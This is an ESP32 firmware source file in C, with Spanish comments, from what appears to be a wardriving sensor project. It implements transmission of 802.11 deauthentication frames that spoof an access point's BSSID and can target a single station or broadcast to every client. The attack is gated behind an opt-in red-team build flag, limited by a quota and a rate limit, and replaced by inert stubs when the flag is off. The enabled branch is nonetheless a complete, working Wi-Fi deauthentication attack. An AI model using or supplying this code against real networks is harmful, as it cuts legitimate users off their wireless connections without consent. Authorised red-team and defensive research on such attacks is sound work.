/*
 * deauth_tx — Transmisión controlada de tramas Deauth/Disassoc 802.11.
 *
 * Implementación real solo si CONFIG_WARDRIVE_DEAUTH_ENABLE=y (opt-in Red
 * Team); si no, stub inerte que mantiene el sensor 100 % receive-only.
 */

#include "deauth_tx.h"

#if CONFIG_WARDRIVE_DEAUTH_ENABLE

#include <string.h>

#include "esp_err.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"

static const char *TAG = "DEAUTH_TX";

/* ---------------- Estado: cola + rate limiting + contadores ---------------- */

static QueueHandle_t s_queue = NULL;
static int64_t s_last_burst_us = 0;
static uint32_t s_total_frames = 0;

static deauth_cycle_stats_t s_cycle;

/* ---------------- Trama Deauth (26 bytes) ---------------- */

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];  /* 0xC0 0x00 deauth · 0xA0 0x00 disassoc */
    uint16_t duration;
    uint8_t addr1[6];       /* Destino: STA o broadcast. */
    uint8_t addr2[6];       /* Transmisor: BSSID del AP. */
    uint8_t addr3[6];       /* BSSID. */
    uint16_t seq_ctrl;
    uint16_t reason;        /* Código de razón (little-endian en aire). */
} dot11_deauth_t;

/** BSSID/STA "FF:FF:FF:FF:FF:FF" (broadcast a todos los clientes del BSS). */
static const uint8_t k_broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/* ---------------- API pública ---------------- */

void deauth_tx_init(void)
{
    memset(&s_cycle, 0, sizeof(s_cycle));
    s_queue = xQueueCreate(DEAUTH_QUEUE_DEPTH, sizeof(deauth_request_t));
    if (s_queue == NULL) {
        ESP_LOGE(TAG, "Sin memoria para la cola de deauth");
    }
}

bool deauth_tx_quota_available(void)
{
    return s_total_frames < (uint32_t)CONFIG_WARDRIVE_DEAUTH_MAX_TOTAL;
}

bool deauth_tx_enqueue(const deauth_request_t *req)
{
    if (s_queue == NULL || req == NULL) {
        return false;
    }
    if (!deauth_tx_quota_available()) {
        s_cycle.rejected++;
        ESP_LOGW(TAG, "Cuota por arranque agotada (%u tramas)", s_total_frames);
        return false;
    }
    int64_t ahora = esp_timer_get_time();
    if (s_last_burst_us != 0 &&
        (ahora - s_last_burst_us) < (int64_t)CONFIG_WARDRIVE_DEAUTH_MIN_PERIOD_S * 1000000LL) {
        s_cycle.rejected++;
        ESP_LOGW(TAG, "Rate-limit: período mínimo %d s entre ráfagas",
                 CONFIG_WARDRIVE_DEAUTH_MIN_PERIOD_S);
        return false;
    }
    if (xQueueSend(s_queue, req, 0) != pdTRUE) {
        s_cycle.rejected++;
        ESP_LOGW(TAG, "Cola de deauth llena");
        return false;
    }
    return true;
}

void deauth_tx_service(deauth_cycle_stats_t *out)
{
    if (out != NULL) {
        memset(out, 0, sizeof(*out));
    }
    if (s_queue == NULL) {
        return;
    }

    deauth_request_t req;
    while (xQueueReceive(s_queue, &req, 0) == pdTRUE) {
        /* Recordar el canal actual (STA asociada al hotspot) para restaurar. */
        uint8_t canal_actual = 0;
        wifi_second_chan_t segundo = WIFI_SECOND_CHAN_NONE;
        bool asociada = (esp_wifi_get_channel(&canal_actual, &segundo) == ESP_OK);

        if (req.channel >= 1 && req.channel <= 14) {
            esp_err_t err = esp_wifi_set_channel(req.channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "set_channel(%u): %s", req.channel, esp_err_to_name(err));
            }
        }

        dot11_deauth_t trama = {
            .frame_ctrl = {0xC0, 0x00},
            .duration = 0x013A,
        };
        memcpy(trama.addr1, req.sta, 6);
        memcpy(trama.addr2, req.bssid, 6);
        memcpy(trama.addr3, req.bssid, 6);
        trama.seq_ctrl = 0x0F00;
        trama.reason = req.reason;

        uint32_t enviadas = 0;
        for (uint8_t i = 0; i < req.count; i++) {
            if (esp_wifi_80211_tx(WIFI_IF_STA, &trama, sizeof(trama), false) == ESP_OK) {
                enviadas++;
            }
            vTaskDelay(pdMS_TO_TICKS(100)); /* Espaciado entre tramas. */
        }

        s_last_burst_us = esp_timer_get_time();
        s_total_frames += enviadas;
        s_cycle.frames += enviadas;
        s_cycle.bursts++;
        if (out != NULL) {
            out->frames += enviadas;
            out->bursts += 1;
        }
        ESP_LOGW(TAG, "Ráfaga ejecutada: %u/%u tramas -> BSSID (ch %u, razón %u). Total boot: %u/%u",
                 (unsigned)enviadas, req.count, req.channel, req.reason,
                 s_total_frames, (unsigned)CONFIG_WARDRIVE_DEAUTH_MAX_TOTAL);

        /* Restaurar el canal del hotspot si estábamos asociados. */
        if (asociada && canal_actual >= 1 && canal_actual <= 14) {
            esp_wifi_set_channel(canal_actual, segundo);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (out != NULL) {
        out->rejected = s_cycle.rejected;
    }
    s_cycle.rejected = 0;
}

#else /* !CONFIG_WARDRIVE_DEAUTH_ENABLE: stubs inertes */

#include <string.h>

void deauth_tx_init(void) {}
bool deauth_tx_quota_available(void) { return false; }
bool deauth_tx_enqueue(const deauth_request_t *req) { (void)req; return false; }
void deauth_tx_service(deauth_cycle_stats_t *out)
{
    if (out != NULL) {
        memset(out, 0, sizeof(*out));
    }
}

#endif /* CONFIG_WARDRIVE_DEAUTH_ENABLE */
